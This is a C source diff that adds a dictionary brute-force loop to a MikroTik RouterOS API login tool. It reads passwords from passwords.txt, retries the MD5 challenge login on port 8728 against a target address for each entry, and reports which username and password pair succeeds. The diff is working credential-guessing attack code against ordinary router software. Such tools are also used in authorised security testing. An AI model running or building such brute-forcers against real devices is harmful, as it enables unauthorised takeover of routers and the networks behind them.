@@ -27,6 +27,7 @@
 #include "hex.h"
 #include "md5.h"
 #include "socket.h"
+#include "stringlist.h"
 
 #define BUF_SIZE 1024
 
@@ -60,9 +61,9 @@ int mtsk_routeros_command_login(int sockfd, const char *username,
 
 	hex_to_bin(&buf[12], 32, bdata);
 
-	printf("-------CHALLENGE-------\n");
-	hex_dump(&bdata[0], 16);
-	printf("-----------------------\n");
+	// printf("-------CHALLENGE-------\n");
+	// hex_dump(&bdata[0], 16);
+	// printf("-----------------------\n");
 
 	MD5_CTX ctx;
 	MD5_Init(&ctx);
@@ -116,30 +117,43 @@ int main(int argc, char **argv)
 	char *target = NULL;
 	uint16_t port = 8728;
 	char *username = "admin";
-	char *password = "";
+	stringlist_t *passwords = NULL;
 
 	target = strdup(argv[1]);
 	port = atoi(argv[2]);
 	username = strdup(argv[3]);
-	password = strdup(argv[4]);
+
+	/* Load passwords */
+	passwords = stringlist_load_file("passwords.txt");
+	if (passwords == NULL) {
+		fprintf(stderr, "Unable to load passworsd dictionary.\n");
+		exit(EXIT_FAILURE);
+	}
+	printf("Loaded %d passwords.\n", passwords->size);
 
 	printf("Probing %s...\n", target);
 
-	int sockfd = mtsk_socket_connect(inet_addr(target), port, 500000);
+	for (int i = 0; i < passwords->size; ++i) {
+		int sockfd =
+			mtsk_socket_connect(inet_addr(target), port, 500000);
 
-	if (sockfd > 0) {
-		int ret =
-			mtsk_routeros_command_login(sockfd, username, password);
-		if (ret == 0) {
-			puts("Login successful!");
-			close(sockfd);
-			exit(EXIT_SUCCESS);
-		} else {
-			puts("Cannot login.");
+		if (sockfd > 0) {
+			char *password = passwords->elements[i];
+			int ret = mtsk_routeros_command_login(sockfd, username,
+							      password);
+			if (ret == 0) {
+				printf("%s:%d \"%s\" \"%s\" - OK\n", target,
+				       port, username, password);
+				close(sockfd);
+				exit(EXIT_SUCCESS);
+			} else {
+				fprintf(stderr, "%s:%d \"%s\" \"%s\" - FAIL\n",
+					target, port, username, password);
+			}
 		}
+		if (sockfd > 0)
+			close(sockfd);
 	}
-
-	close(sockfd);
 
 	return EXIT_FAILURE;
 }
